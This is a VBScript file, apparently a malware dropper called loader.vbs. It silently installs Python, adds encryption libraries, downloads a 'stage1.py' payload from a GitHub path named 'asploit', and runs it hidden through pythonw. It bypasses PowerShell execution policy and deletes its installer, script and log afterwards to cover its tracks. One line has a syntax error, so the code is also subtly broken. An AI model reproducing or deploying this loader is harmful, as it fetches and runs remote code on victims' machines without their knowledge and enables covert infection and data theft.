' loader.vbs
' Single-file script to download and install Python, download a Python script, install libraries, and execute the script silently

' Variables
Dim PYTHON_URL, SCRIPT_URL, PYTHON_VERSION, INSTALL_DIR, SCRIPT_DIR, TEMP_DIR, PYTHON_INSTALLER, SCRIPT_NAME, LOG_FILE
' Preconfigured URLs
PYTHON_URL = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1.py"

' Extract Python version from the URL (e.g., "3.11.7" → "311")
Dim versionParts, majorMinor
versionParts = Split(PYTHON_URL, "/")
PYTHON_VERSION = versionParts(UBound(versionParts) ' e.g., "python-3.11.7-amd64.exe"
majorMinor = Mid(PYTHON_VERSION, InStr(PYTHON_VERSION, "-") + 1, InStr(PYTHON_VERSION, "-amd64.exe") - InStr(PYTHON_VERSION, "-") - 1) ' e.g., "3.11.7"
majorMinor = Replace(Left(majorMinor, InStr(majorMinor, ".") + 2), ".", "") ' e.g., "311"

' Set paths
Set WShell = CreateObject("WScript.Shell")
SCRIPT_DIR = WShell.CurrentDirectory ' Directory where loader.vbs is located
INSTALL_DIR = WShell.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python" & majorMinor ' e.g., %LocalAppData%\Programs\Python\Python311

' Generate a unique temporary directory name using a timestamp and random number
Dim timestamp
timestamp = Replace(Replace(Replace(Now, "/", ""), ":", ""), " ", "_") ' e.g., "2025-04-05_12-34-56"
TEMP_DIR = WShell.ExpandEnvironmentStrings("%TEMP%") & "\tmp_" & timestamp & "_" & Int((9999 * Rnd) + 1000)
PYTHON_INSTALLER = TEMP_DIR & "\python-installer.exe"
SCRIPT_NAME = TEMP_DIR & "\stage1.py"
LOG_FILE = TEMP_DIR & "\debug.log"

' Create a shell object for running commands
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")

' Create temp directory silently, handle if it already exists
If Not FSO.FolderExists(TEMP_DIR) Then
    FSO.CreateFolder TEMP_DIR
End If

' Function to log messages to a file (for debugging)
Function LogMessage(message)
    Dim logStream
    Set logStream = FSO.OpenTextFile(LOG_FILE, 8, True)
    logStream.WriteLine Now & ": " & message
    logStream.Close
End Function

' Function to run PowerShell commands silently
Function RunPowerShellCommand(command)
    LogMessage "Running PowerShell command: " & command
    WShell.Run "powershell.exe -ExecutionPolicy Bypass -Command """ & command & """", 0, True
End Function

' Download the Python installer
LogMessage "Downloading Python installer from: " & PYTHON_URL
RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & PYTHON_URL & "' -OutFile '" & PYTHON_INSTALLER & "' -UseBasicParsing"

' Check if the installer was downloaded
If Not FSO.FileExists(PYTHON_INSTALLER) Then
    LogMessage "Failed to download Python installer."
    If FSO.FolderExists(TEMP_DIR) Then
        FSO.DeleteFolder TEMP_DIR
    End If
    WScript.Quit 1
End If
LogMessage "Python installer downloaded to: " & PYTHON_INSTALLER

' Check if Python is already installed in the target directory
Dim pythonFound, pythonPath, pythonVersion
pythonFound = False
pythonPath = INSTALL_DIR & "\python.exe"
On Error Resume Next
If FSO.FileExists(pythonPath) Then
    pythonVersion = WShell.Exec("""" & pythonPath & """ --version").StdOut.ReadAll
    If InStr(pythonVersion, "3.11") > 0 Then ' Check for Python 3.11 specifically
        pythonFound = True
        LogMessage "Python 3.11 found in target directory: " & INSTALL_DIR
    End If
End If
On Error GoTo 0

' Install Python if not found
If Not pythonFound Then
    LogMessage "Installing Python to: " & INSTALL_DIR
    ' Install Python silently (per-user installation, no admin rights needed)
    Dim installCmd
    installCmd = """" & PYTHON_INSTALLER & """ /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_tcltk=1 TargetDir=""" & INSTALL_DIR & """"
    Dim installResult
    Set installResult = WShell.Exec(installCmd)
    Do While installResult.Status = 0
        WScript.Sleep 100
    Loop
    If installResult.ExitCode <> 0 Then
        LogMessage "Python installation failed with exit code: " & installResult.ExitCode
        If FSO.FolderExists(TEMP_DIR) Then
            FSO.DeleteFolder TEMP_DIR
        End If
        WScript.Quit 1
    End If

    ' Check if installation succeeded
    If Not FSO.FileExists(pythonPath) Then
        LogMessage "Python installation failed. python.exe not found in: " & INSTALL_DIR
        If FSO.FolderExists(TEMP_DIR) Then
            FSO.DeleteFolder TEMP_DIR
        End If
        WScript.Quit 1
    End If
    LogMessage "Python installed successfully."

    ' Update PATH for the current session
    WShell.Environment("PROCESS")("PATH") = WShell.Environment("PROCESS")("PATH") & ";" & INSTALL_DIR & ";" & INSTALL_DIR & "\Scripts"
End If

' Verify Python is available and get its path
On Error Resume Next
WShell.Run """" & pythonPath & """ --version", 0, True
If Err.Number <> 0 Then
    LogMessage "Python verification failed after installation. Error: " & Err.Description
    If FSO.FolderExists(TEMP_DIR) Then
        FSO.DeleteFolder TEMP_DIR
    End If
    WScript.Quit 1
End If
On Error GoTo 0
LogMessage "Python path: " & pythonPath

' Ensure pip is installed
LogMessage "Ensuring pip is installed..."
WShell.Run """" & pythonPath & """ -m ensurepip", 0, True

' Install required libraries silently (match stage1.py requirements)
LogMessage "Installing required libraries..."
WShell.Run """" & pythonPath & """ -m pip install --quiet requests pyaes pycryptodome", 0, True

' Download the Python script after Python and libraries are installed
LogMessage "Downloading Python script from: " & SCRIPT_URL
RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & SCRIPT_URL & "' -OutFile '" & SCRIPT_NAME & "' -UseBasicParsing"

' Check if the script was downloaded
If Not FSO.FileExists(SCRIPT_NAME) Then
    LogMessage "Failed to download Python script."
    If FSO.FolderExists(TEMP_DIR) Then
        FSO.DeleteFolder TEMP_DIR
    End If
    WScript.Quit 1
End If
LogMessage "Python script downloaded to: " & SCRIPT_NAME

' Execute the script in the background with pythonw.exe (no console window)
LogMessage "Executing script: " & SCRIPT_NAME
WShell.Run """" & INSTALL_DIR & "\pythonw.exe"" """ & SCRIPT_NAME & """", 0, False

' Cleanup
LogMessage "Cleaning up..."
If FSO.FileExists(PYTHON_INSTALLER) Then
    FSO.DeleteFile PYTHON_INSTALLER
End If
If FSO.FileExists(SCRIPT_NAME) Then
    FSO.DeleteFile SCRIPT_NAME
End If
If FSO.FileExists(LOG_FILE) Then
    FSO.DeleteFile LOG_FILE
End If
If FSO.FolderExists(TEMP_DIR) Then
    FSO.DeleteFolder TEMP_DIR
End If

' Exit
WScript.Quit 0
